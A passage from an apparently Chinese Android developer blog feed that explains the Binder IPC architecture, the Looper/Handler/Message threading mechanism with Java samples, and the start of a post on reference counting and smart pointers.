<h2 id="1-1-Binder能很好的实现C-S架构"><a href="#1-1-Binder能很好的实现C-S架构" class="headerlink" title="1.1 Binder能很好的实现C/S架构"></a>1.1 Binder能很好的实现C/S架构</h2><p>Android系统，很大一部分都是居于Client-Server架构的设计。Client端有什么需求，直接发送给Server端去完成，Server处理完毕再将反馈内容发送给Client。Server端与Client端相对独立，稳定性较好。传统的CS架构只有Socket，但是Socket通信效率相对于其他IPC来说又太低效，而Binder正是基于C/S架构设计的。</p>
<h2 id="1-2-Binder传输效率高"><a href="#1-2-Binder传输效率高" class="headerlink" title="1.2 Binder传输效率高"></a>1.2 Binder传输效率高</h2><p>Binder只需要进行一次拷贝，把Client端的用户空间的数据即copy_from_user()到内核空间，然后将内核空间的数据映射到Server端的用户空间。<br>Binder性能上仅仅次于Linux 共享内存的方式，但是共享内存的方式，进程间同步又是一个难题。</p>
<h2 id="1-3-Binder安全性极高"><a href="#1-3-Binder安全性极高" class="headerlink" title="1.3 Binder安全性极高"></a>1.3 Binder安全性极高</h2><p>Android为每个安装好的应用程序分配了自己的UID，故进程的UID是鉴别进程身份的重要标志，Client端将任务发送给Server端，Server端会根据权限控制策略，判断UID/PID是否满足访问权限。<br>Client-Server通信过程中，Binder内核会为每个Client进程分配了UID/PID来作为鉴别身份的标示，并且在Binder通信时会根据UID/PID进行有效性检测。<br>而如果是传统的IPC只能由在数据包当中填入UID/PID，这个并不是一个可靠的方法。</p>
<p>知乎上有一位答主讲得很好，可以看看:</p>
<blockquote>
<p><strong><a href="https://www.zhihu.com/question/39440766" target="_blank" rel="external">为什么 Android 要采用 Binder 作为 IPC 机制?</a></strong></p>
</blockquote>
<h1 id="二、Binder原理"><a href="#二、Binder原理" class="headerlink" title="二、Binder原理"></a>二、Binder原理</h1><p><img src="/img/archives/binder-01.jpg" alt="binder-ipc"></p>
<ol>
<li>Binder采用Client-Server架构，包含Client、Server、ServiceManager、Binder驱动四个组件。</li>
<li><strong>应用程序都运行在用户空间，每个应用程序都有它自己独立的内存空间</strong>；若不同的应用程序之间涉及到通信，需要通过内核进行中转，因为需要用到内核的<code>copy_from_user()</code>和<code>copy_to_user()</code>等函数</li>
<li>Server进程要先注册Service到ServiceManager，Client进程使用某Server的Service前，须先向ServiceManager中获取相应的Service，然后使用Service。</li>
</ol>
<h1 id="三、Binder驱动层"><a href="#三、Binder驱动层" class="headerlink" title="三、Binder驱动层"></a>三、Binder驱动层</h1><center><br><img src="/img/archives/binder-02.png" alt="binder-driver"><br></center>

<p>当用户空间调用open()方法，最终会调用binder驱动的binder_open()方法；mmap()/ioctl()方法也是同理，从用户态进入内核态，都依赖于系统调用过程。</p>
<h2 id="3-1-binder-init"><a href="#3-1-binder-init" class="headerlink" title="3.1 binder_init"></a>3.1 binder_init</h2><p>注册misc设备，指定相应文件操作的方法。</p>
<h2 id="3-2-binder-open"><a href="#3-2-binder-open" class="headerlink" title="3.2 binder_open"></a>3.2 binder_open</h2><p>创建binder_proc对象，并把当前进程等信息保存到binder_proc对象，该对象管理IPC所需的各种信息并拥有其他结构体的根结构体；再把binder_proc对象保存到文件指针filp，以及把binder_proc加入到全局链表binder_procs。</p>
<h2 id="3-3-binder-mmap"><a href="#3-3-binder-mmap" class="headerlink" title="3.3 binder_mmap"></a>3.3 binder_mmap</h2><p>在内核虚拟地址空间，申请一块与用户虚拟内存相同大小的内存；然后再申请1个page大小的物理内存，再将同一块物理内存分别映射到内核虚拟地址空间和用户虚拟内存空间，从而实现了用户空间的Buffer和内核空间的Buffer同步操作的功能。</p>
<h2 id="3-4-binder-ioctl"><a href="#3-4-binder-ioctl" class="headerlink" title="3.4 binder_ioctl"></a>3.4 binder_ioctl</h2><p>负责在两个进程间收发IPC数据和IPC reply数据。调用流程比如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//step 1:</span></div><div class="line">binder_write_read bwr;</div><div class="line">ioctl(mProcess-&gt;mDriverFD, BINDER_WRITE_READ, &amp;bwr) </div><div class="line">    <span class="comment">// step 2:</span></div><div class="line">    binder_ioctl(filp, BINDER_WRITE_READ, &amp;bwr)</div><div class="line">        <span class="comment">// step 3:</span></div><div class="line">        binder_ioctl_write_read(filp, BINDER_WRITE_READ, &amp;bwr, thread)</div><div class="line">            <span class="comment">// step 4:</span></div><div class="line">            copy_from_user(&amp;bwr, ubuf, <span class="keyword">sizeof</span>(bwr))</div><div class="line">            binder_thread_write(proc, thread, bwr.write_buffer, bwr.write_size, &amp;bwr.write_consumed);</div><div class="line">            binder_thread_read(proc, thread, bwr.read_buffer, bwr.read_size, &amp;bwr.read_consumed, filp-&gt;f_flags &amp; O_NONBLOCK);</div><div class="line">            copy_to_user(...)</div></pre></td></tr></table></figure>
<p><strong>binder_thread_write()</strong>：处理Binder请求码，以”BC_“开头，简称BC码，用于从IPC层传递到Binder Driver层；<br><strong>binder_thread_read()</strong>：生成Binder响应码，以”BR_“开头，简称BR码，用于从Binder Driver层传递到IPC层；</p>
<p><img src="/img/archives/binder-04.jpg" alt="binder-04"></p>
<h1 id="四、Binder通信流程"><a href="#四、Binder通信流程" class="headerlink" title="四、Binder通信流程"></a>四、Binder通信流程</h1><p>例如当名为<code>BatteryStatsService</code>的Client向<code>ServiceManager</code>注册服务的过程中，IPC层的数据组成为：<br><strong>Handle=0，RPC代码为ADD_SERVICE_TRANSACTION，RPC数据为BatteryStatsService，Binder协议为BC_TRANSACTION。</strong><br>整个流程图大致如下：</p>
<center><br><img src="/img/archives/binder-05.png" alt="binder-05"><br></center>

<p>handle为0正是指向ServiceManager。</p>
<h1 id="五、启动ServiceManager"><a href="#五、启动ServiceManager" class="headerlink" title="五、启动ServiceManager"></a>五、启动ServiceManager</h1><p>ServiceManager启动时序图：</p>
<p><img src="/img/archives/create_servicemanager.jpg" alt="servicemanager_create"></p>
<ol>
<li>打开binder驱动，并调用mmap()方法分配128k的内存映射空间：binder_open();</li>
<li>通知binder驱动使其成为守护进程：binder_become_context_manager()；</li>
<li>验证selinux权限，判断进程是否有权注册或查看指定服务；</li>
<li>进入循环状态，等待Client端的请求：binder_loop()。</li>
</ol>
<h1 id="六、获取ServiceManager"><a href="#六、获取ServiceManager" class="headerlink" title="六、获取ServiceManager"></a>六、获取ServiceManager</h1><p>获取Service Manager是通过defaultServiceManager()方法来完成，当进程注册服务(addService)或 获取服务(getService)的过程之前，都需要先调用defaultServiceManager()方法来获取gDefaultServiceManager对象。</p>
<p><img src="/img/archives/get_servicemanager.jpg" alt="get_servicemanager.jpg"></p>
<ol>
<li>获取ProcessState对象，在其构造函数中调用open_driver函数打开Binder驱动，并将句柄保存到mDriverFD；</li>
<li>调用gProcess-&gt;getContextObject函数来获得一个句柄值为0的Binder引用，即BpBinder；</li>
<li>通过<code>interface_cast</code>构造一个BpServiceManager对象，所以gDefaultServiceManager最终为<code>new BpServiceManager(new BpBinder(0))</code>。</li>
</ol>
<h1 id="七、addService"><a href="#七、addService" class="headerlink" title="七、addService"></a>七、addService</h1><p>以Native层的服务以media服务为例，注册MediaPlayerService的时序图如下：</p>
<p><img src="/img/archives/add-service.jpg" alt="add-servive"></p>
<ol>
<li>defaultServiceManager()返回的是BpServiceManager，会调用<code>BpServiceManager.addService</code>方法</li>
<li><code>addService()</code>通过remote()中保存的BpBinder调用到IPCThreadState的transact方法；</li>
<li>IPCThreadState::transact会调用writeTransactionData()传输数据传输数据，然后和驱动交互，驱动把请求转发给ServiceManager执行真正的注册服务；</li>
<li>得到驱动的返回后，调用BBinder，最终调用到BnMediaPlayerService的onTransact方法；</li>
<li>开启两个线程不断和Binder进行交互，获取Client请求。</li>
</ol>
<p>获取服务的流程基本也是差不多的，不再累述。</p>
<h1 id="八、Binder架构"><a href="#八、Binder架构" class="headerlink" title="八、Binder架构"></a>八、Binder架构</h1><p>binder在framework层，采用JNI技术来调用native(C/C++)层的binder架构，从而为上层应用程序提供服务。 我们知道native层中，binder是C/S架构，分为Bn端(Server)和Bp端(Client)。对于java层在命名与架构上非常相近，同样实现了一套IPC通信架构。</p>
<p><img src="/img/archives/java_binder.jpg" alt="java-binder"></p>
<p>1.BinderProxy类代码Client端,Binder类代表Server端<br>2.framework层的Binder逻辑是建立在Native层架构基础之上的，核心逻辑都是交予Native层方法来处理</p>
<p><strong>比如addService流程：</strong><br>1.java层通过getIServiceManager获得ServiceManagerProxy对象，通过该对象的BinderProxy，最终会调用BpBinder对象，由BpBinder来完成通信。<br>2.Binder驱动将Client端的请求转发给BBinder的transact方法，然后由其子类JavaBBinder调用。后者会调用指定Service的方法，并返回给驱动。</p>
<h1 id="九、Binder类图"><a href="#九、Binder类图" class="headerlink" title="九、Binder类图"></a>九、Binder类图</h1><h2 id="9-1-Native-Binder类图"><a href="#9-1-Native-Binder类图" class="headerlink" title="9.1 Native Binder类图"></a>9.1 Native Binder类图</h2><p><img src="/img/archives/binder_native_class.jpg" alt="binder_native_class.jpg"></p>
<h2 id="9-2-Framework-Binder类图"><a href="#9-2-Framework-Binder类图" class="headerlink" title="9.2 Framework Binder类图"></a>9.2 Framework Binder类图</h2><p><img src="/img/archives/class_ServiceManager.jpg" alt="class_ServiceManager.jpg"></p>
<h1 id="十、Binder其他"><a href="#十、Binder其他" class="headerlink" title="十、Binder其他"></a>十、Binder其他</h1><p>介绍一些Binder其他比较重要的点，方便理清Binder的一些疑问。比如Binder实体和引用，比如ProcessState和IPCThreadState，比如数据结构怎么传递等。</p>
<h2 id="10-1-Binder中各个角色的关系"><a href="#10-1-Binder中各个角色的关系" class="headerlink" title="10.1 Binder中各个角色的关系"></a>10.1 Binder中各个角色的关系</h2><p><img src="/img/archives/binder_relationship.jpg" alt="binder_relationship.jpg"></p>
<p><strong>1. Binder实体 : binder_node</strong></p>
<p>Binder实体，是各个Server以及ServiceManager在内核中的存在形式。<br>Binder实体实际上是内核中 <strong><code>binder_node</code></strong> 结构体的对象，它的作用是在内核中保存Server和ServiceManager的信息(例如，Binder实体中保存了Server对象在用户空间的地址)。简言之，Binder实体是Server在Binder驱动中的存在形式，内核通过Binder实体可以找到用户空间的Server对象。<br>在上图中，Server和ServiceManager在Binder驱动中都对应的存在一个Binder实体。</p>
<p><strong>2. Binder引用 : binder_ref</strong></p>
<p>所谓Binder引用，实际上是内核中<strong><code>binder_ref</code></strong>结构体的对象，它的作用是在表示”Binder实体”的引用。换句话说，每一个Binder引用都是某一个Binder实体的引用，通过Binder引用可以在内核中找到它对应的Binder实体。<br>如果将Server看作是Binder实体的话，那么Client就好比Binder引用。Client要和Server通信，它就是通过保存一个Server对象的Binder引用，再通过该Binder引用在内核中找到对应的Binder实体，进而找到Server对象，然后将通信内容发送给Server对象。<br>Binder实体和Binder引用都是内核(即Binder驱动)中的数据结构。每一个Server在内核中就表现为一个Binder实体，而每一个Client则表现为一个Binder引用。这样，每个Binder引用都对应一个Binder实体，而每个Binder实体则可以多个Binder引用。</p>
<p><strong>3. 远程服务</strong></p>
<p>Server都是以服务的形式注册到ServiceManager中进行管理的。如果将Server本身看作是”本地服务”的话，那么Client中的”远程服务”就是本地服务的代理。如果你对代理模式比较熟悉的话，就很容易理解了，远程服务就是本地服务的一个代理，通过该远程服务Client就能和Server进行通信。</p>
<h2 id="10-2-进程和线程的关系"><a href="#10-2-进程和线程的关系" class="headerlink" title="10.2 进程和线程的关系"></a>10.2 进程和线程的关系</h2><p><img src="/img/archives/binder-proc-relation.png" alt="binder_proc_relation.png"></p>
<p><strong> 图解：</strong><br>1.Binder驱动通过<code>binder_procs</code>链表记录所有创建的<code>binder_proc</code>结构体，binder驱动层的每一个binder_proc结构体都与用户空间的一个用于binder通信的进程一一对应。<br>2.每个进程有且只有一个<code>ProcessState</code>对象，这是通过单例模式来保证的。<br>3.每个进程中可以有很多个线程，每个线程对应一个<code>IPCThreadState</code>对象，IPCThreadState对象也是单例模式，即一个线程对应一个IPCThreadState对象，在Binder驱动层也有与之相对应的结构，那就是<code>Binder_thread</code>结构体。在binder_proc结构体中通过成员变量<code>rb_root threads</code>，来记录当前进程内所有的binder_thread。</p>
<p><strong>Binder线程池：</strong><br>每个Server进程在启动时会创建一个binder线程池，并向其中注册一个Binder线程；之后Server进程也可以向binder线程池注册新的线程，或者Binder驱动在探测到没有空闲binder线程时会主动向Server进程注册新的的binder线程。对于一个Server进程有一个最大Binder线程数限制，默认为16个binder线程，例如Android的system_server进程就存在16个线程。对于所有Client端进程的binder请求都是交由Server端进程的binder线程来处理的。</p>
<h2 id="10-3-Binder数据传输"><a href="#10-3-Binder数据传输" class="headerlink" title="10.3 Binder数据传输"></a>10.3 Binder数据传输</h2><p><img src="/img/archives/binder_data.jpg" alt="binder_data.jpg"></p>
<p>当Client向Server发送请求时，Client会将数据打包成上述格式，然后通过ioctl()发送给Binder驱动。</p>
<ol>
<li>用户空间的进程调用<strong>ioctl(fd,BINDER_WRITE_READ,&amp;bwr)</strong>时传递给Binder驱动的信息。fd是Binder驱动的文件句柄，BINDER_WRITE_READ是ioctl()的一个标识，而bwr是传递的数据，<code>write_buffer</code>是请求数据的内容，而<code>write_consumed</code>是用来记录请求数据中已经被Binder驱动处理过的数据的大小。</li>
<li>ioctl会走到<strong>binder_thread_write</strong>和<strong>binder_thread_read</strong>。这层的数据是”事务指令”+”binder_transaction_data结构体”组成的。data是保存事务中具体数据的内存地址。具体调用流程可以参考<strong>#3.4章节</strong></li>
<li>这层是有效数据。如果该请求是传递给ServiceManager进行处理的，则有效数据是：消息头+”Server的相关信息”。消息头是用来进行有效性检查的，而”Server的相关信息”则是请求要处理的信息。</li>
</ol>
<h1 id="十一、源码目录"><a href="#十一、源码目录" class="headerlink" title="十一、源码目录"></a>十一、源码目录</h1><p>从上之下, 整个Binder架构所涉及的总共有以下5个目录:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/framework/base/core/java/               (Java)</div><div class="line">/framework/base/core/jni/                (JNI)</div><div class="line">/framework/native/libs/binder            (Native)</div><div class="line">/framework/native/cmds/servicemanager/   (Native)</div><div class="line">/kernel/drivers/staging/android          (Driver)</div></pre></td></tr></table></figure></p>
<h2 id="11-1-Java-framework"><a href="#11-1-Java-framework" class="headerlink" title="11.1 Java framework"></a>11.1 Java framework</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">/framework/base/core/java/android/os/  </div><div class="line">    - IInterface.java</div><div class="line">    - IBinder.java</div><div class="line">    - Parcel.java</div><div class="line">    - IServiceManager.java</div><div class="line">    - ServiceManager.java</div><div class="line">    - ServiceManagerNative.java</div><div class="line">    - Binder.java  </div><div class="line">    </div><div class="line">/framework/base/core/jni/    </div><div class="line">    - android_os_Parcel.cpp</div><div class="line">    - AndroidRuntime.cpp</div><div class="line">    - android_util_Binder.cpp (核心类)</div></pre></td></tr></table></figure>
<h2 id="11-2-Native-framework"><a href="#11-2-Native-framework" class="headerlink" title="11.2 Native framework"></a>11.2 Native framework</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">/framework/native/libs/binder         </div><div class="line">    - IServiceManager.cpp</div><div class="line">    - BpBinder.cpp</div><div class="line">    - Binder.cpp</div><div class="line">    - IPCThreadState.cpp (核心类)</div><div class="line">    - ProcessState.cpp  (核心类)</div><div class="line"></div><div class="line">/framework/native/include/binder/ </div><div class="line">    - IServiceManager.h</div><div class="line">    - IInterface.h</div><div class="line"></div><div class="line">/framework/native/cmds/servicemanager/ </div><div class="line">    - service_manager.c</div><div class="line">    - binder.c</div></pre></td></tr></table></figure>
<h2 id="11-3-Kernel"><a href="#11-3-Kernel" class="headerlink" title="11.3 Kernel"></a>11.3 Kernel</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/kernel/drivers/staging/android/</div><div class="line">    - binder.c</div><div class="line">    - uapi/binder.h</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是关于Android Binder机制的一篇文章，Binder是Android里面非常重要的组成，也是最难理解的一块知识点，学习Binder最好的方法是深入源码阅读，因为Binder相关的知识错综复杂，一般初学者也很容易迷失在源码的汪洋里，本文旨在梳理Binder的架构和流程，并且试着以实用的角度来看待Binder。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Binder" scheme="https://maoao530.github.io/tags/Binder/"/>
    
  </entry>
  
  <entry>
    <title>Android消息机制</title>
    <link href="https://maoao530.github.io/2016/12/11/android-looper-handler-message/"/>
    <id>https://maoao530.github.io/2016/12/11/android-looper-handler-message/</id>
    <published>2016-12-11T06:17:21.000Z</published>
    <updated>2017-01-31T05:49:15.546Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍Android的消息机制。</p>
<a id="more"></a>
<h1 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h1><p>假设现在我们有这样的需求，点一下图中的button，然后去获取一些数据（假设这个步骤是一个耗时的操作），然后获取完后将得到的数据返回显示到屏幕上。<br>为了避免产生<code>ANR(Application Not Response)</code>问题，通常我们会在新的线程去做耗时的操作，然后在UI线程里面更新组件，所以Handler就是类似这样子一个机制。</p>
<p><img src="/img/archives/android-looper-handler-message-01.png" alt="android-looper-handler-message-01.png"></p>
<p>那么我们会怎么去实现呢？可以参考如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDriverActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">        tv = (TextView)findViewById(R.id.tv);</div><div class="line">        btn = (Button)findViewById(R.id.btn);</div><div class="line"></div><div class="line">        <span class="comment">// 接收并处理消息</span></div><div class="line">        mHandler = <span class="keyword">new</span> Handler()&#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span></span>&#123;</div><div class="line">                <span class="keyword">if</span> (message.what == <span class="number">0x11</span>)&#123;</div><div class="line">                    Toast.makeText(getApplicationContext(), <span class="string">"mHandler handleMessage"</span> );</div><div class="line">                    tv.setText(<span class="string">"mHandler is receive message"</span>)</div><div class="line">                &#125;</div><div class="line">                </div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line"></div><div class="line">        <span class="comment">// 监听</span></div><div class="line">        btn.setOnClickListener(<span class="keyword">new</span> View.onClickListener()&#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</div><div class="line">                MyThread t = <span class="keyword">new</span> MyThread(mHandler);</div><div class="line">                t.start();</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</div><div class="line">    Handler handler;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyThread</span><span class="params">(Handler handler)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        <span class="keyword">this</span>.handler = handler;</div><div class="line">    &#125;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">super</span>.run();</div><div class="line">        mHandler.sendEmptyMessage(<span class="number">0x11</span>);  <span class="comment">//发送消息</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这只是一种实现的方式，如果在<code>子线程</code>而不是ui线程去初始化handler，则需要初始化<code>handler</code>前调用<code>Looper.prepare()</code>，初始化结束后调用<code>Looper.loop()</code>。</p>
<h1 id="二、相关概念"><a href="#二、相关概念" class="headerlink" title="二、相关概念"></a>二、相关概念</h1><p>学习Android的消息处理机制，有几个概念（类）必须了解：</p>
<ol>
<li><strong>Message</strong><br>消息，理解为线程间通讯的数据单元。例如后台线程在处理数据完毕后需要更新UI，则可发送一条包含更新信息的Message给UI线程。</li>
<li><strong>Message Queue</strong><br>消息队列，用来存放通过Handler发布的消息，按照先进先出执行。</li>
<li><strong>Handler</strong><br>Handler是Message的主要处理者，负责将Message添加到消息队列以及对消息队列中的Message进行处理。</li>
<li><strong>Looper</strong><br>循环器，扮演Message Queue和Handler之间桥梁的角色，循环取出Message Queue里面的Message，并交付给相应的Handler进行处理。</li>
<li><strong>Thread</strong><br>UI thread 通常就是main thread，而Android启动程序时会替它建立一个Message Queue。<br>每一个线程里可含有一个Looper对象以及一个MessageQueue数据结构。在你的应用程序里，可以定义Handler的子类别来接收Looper所送出的消息。</li>
</ol>
<h1 id="三、Looper"><a href="#三、Looper" class="headerlink" title="三、Looper"></a>三、Looper</h1><p>Looper被设计用来使一个普通线程变成Looper线程。所谓Looper线程就是循环工作的线程。在程序开发中（尤其是GUI开发中），我们经常会需要一个线程不断循环，一旦有新任务则执行，执行完继续等待下一个任务，这就是Looper线程。使用Looper类创建Looper线程很简单：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LooperThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// 将当前线程初始化为Looper线程</span></div><div class="line">        Looper.prepare();</div><div class="line">        </div><div class="line">        <span class="comment">// ...其他处理，如实例化handler</span></div><div class="line">        </div><div class="line">        <span class="comment">// 开始循环处理消息队列</span></div><div class="line">        Looper.loop();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3-1-Looper-prepare"><a href="#3-1-Looper-prepare" class="headerlink" title="3.1 Looper.prepare()"></a>3.1 Looper.prepare()</h2><p>当执行了<code>Looper.prepare()</code>后，当前线程就会升级为Looper线程：</p>
<p><img src="/img/archives/android-looper-prepare.png" alt="android-looper-prepare.png"></p>
<ul>
<li>一个Thread只能有一个Looper对象</li>
<li>线程中有一个Looper对象，它的内部维护了一个消息队列MessageQueue</li>
</ul>
<h2 id="3-2-Looper-loop"><a href="#3-2-Looper-loop" class="headerlink" title="3.2 Looper.loop()"></a>3.2 Looper.loop()</h2><p>当调用loop方法后，Looper线程就开始真正工作了，它不断从自己的MQ中取出队头的消息(也叫任务)执行。</p>
<p><img src="/img/archives/android-looper-loop.png" alt="android-looper-loop.png"></p>
<p>那么，我们如何往MQ上添加消息呢？下面有请Handler</p>
<h1 id="四、Handler"><a href="#四、Handler" class="headerlink" title="四、Handler"></a>四、Handler</h1><p>Handler扮演了往MQ上添加消息和处理消息的角色（只处理由自己发出的消息），即往MQ上添加消息的时候执行sendMessage，并在loop到自己的时候处理消息执行handleMessage，整个过程是异步的。</p>
<p><strong>Handler创建时会关联一个looper，默认关联当前线程的looper。</strong></p>
<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LooperThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>{
    <span class="keyword">private</span> Handler handler1;
    <span class="keyword">private</span> Handler handler2;

    <span class="meta">@Override</span>
    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>{
        <span class="comment">// 将当前线程初始化为Looper线程</span>
        Looper.prepare();

        <span class="comment">// 实例化两个handler</span>
        handler1 = <span class="keyword">new</span> Handler(); 
        handler2 = <span class="keyword">new</span> Handler();

        <span class="comment">// 开始循环处理消息队列</span>
        Looper.loop();
    }
}
</code></pre>
<p>加入Handler后结构图如下：</p>
<p><img src="/img/archives/android-looper-handler-2.png" alt="android-looper-handler-2.png"></p>
<p><strong>一个线程可以有多个Handler，但是只能有一个Looper。</strong></p>
<h1 id="4-1-Handler发送消息和处理消息"><a href="#4-1-Handler发送消息和处理消息" class="headerlink" title="4.1 Handler发送消息和处理消息"></a>4.1 Handler发送消息和处理消息</h1><p>大致流程：</p>
<ol>
<li>mHandler.sendMessage()发送消息到MQ</li>
<li>Looper.loop()将message不断从MQ从取出来交给handler处理</li>
<li>mHandler.handleMessage()处理消息</li>
</ol>
<p><img src="/img/archives/android-handler-send-handle-msg.PNG" alt="android-handler-send-handle-msg.PNG"></p>
<h1 id="五、回顾"><a href="#五、回顾" class="headerlink" title="五、回顾"></a>五、回顾</h1><p>那么回到一开始我们举的例子，在非UI线程去做耗时的操作，然后完成后在UI线程更新UI信息。那么这种case下，我们的结构图是这样的：</p>
<p><img src="/img/archives/android-ui-thread-handler.PNG" alt="android-ui-thread-handler.PNG"></p>
<p>至此，本文介绍的内容已经完成，本文内容大部分非原创，更多的是基于其他博客的和自己理解的总结，好记性不如烂笔头。如果需要了解源码的同学，可以继续深入阅读研究，包括Java层Looper，Handler，Message，MessageQueue的源码和Native层Looper，NativeMessageQueue的源码实现。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍Android的消息机制。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Looper" scheme="https://maoao530.github.io/tags/Looper/"/>
    
      <category term="Handler" scheme="https://maoao530.github.io/tags/Handler/"/>
    
      <category term="Message" scheme="https://maoao530.github.io/tags/Message/"/>
    
  </entry>
  
  <entry>
    <title>引用计数 Android智能指针</title>
    <link href="https://maoao530.github.io/2016/12/10/cpp-ref-count/"/>
    <id>https://maoao530.github.io/2016/12/10/cpp-ref-count/</id>
    <published>2016-12-10T03:48:56.000Z</published>
    <updated>2017-01-31T05:52:06.507Z</updated>
    
    <content type="html"><![CDATA[<p>引用计数机制</p>
<p>以前学cocos写游戏的时候有接触过这个概念。</p>
<p>引用计数是计算机编程语言中的一种内存管理技术，是指将资源（可以是对象、内存或磁盘空间等等）的被引用次数保存起来，当被引用次数变为零时就将其释放的过程。使用引用计数技术可以实现自动资源管理的目的。</p>
<a id="more"></a>
<h1 id="一、什么是引用计数"><a href="#一、什么是引用计数" class="headerlink" title="一、什么是引用计数"></a>一、什么是引用计数</h1><p>简单来讲，当我们创建一个对象的实例并在堆上申请内存时，对象的引用计数就为1，在其他对象中需要持有这个对象时，就需要把该对象的引用计数加1，需要释放一个对象时，就将该对象的引用计数减1，直至对象的引用计数为0，对象的内存会被立刻释放。</p>
<h1 id="二、什么是智能指针？"><a href="#二、什么是智能指针？" class="headerlink" title="二、什么是智能指针？"></a>二、什么是智能指针？</h1><p>C语言、C++语言没有自动内存回收机制，关于内存的操作的安全性依赖于程序员的自觉。程序员每次new出来的内存块都需要自己使用delete进行释放，流程复杂可能会导致忘记释放内存而造成内存泄漏。而智能指针也致力于解决这种问题，使程序员专注于指针的使用而把内存管理交给智能指针。</p>
<h1 id="三、使用引用计数来实现智能指针"><a href="#三、使用引用计数来实现智能指针" class="headerlink" title="三、使用引用计数来实现智能指针"></a>三、使用引用计数来实现智能指针</h1><p>了解了引用计数，我们可以使用它来写我们的智能指针类了。</p>
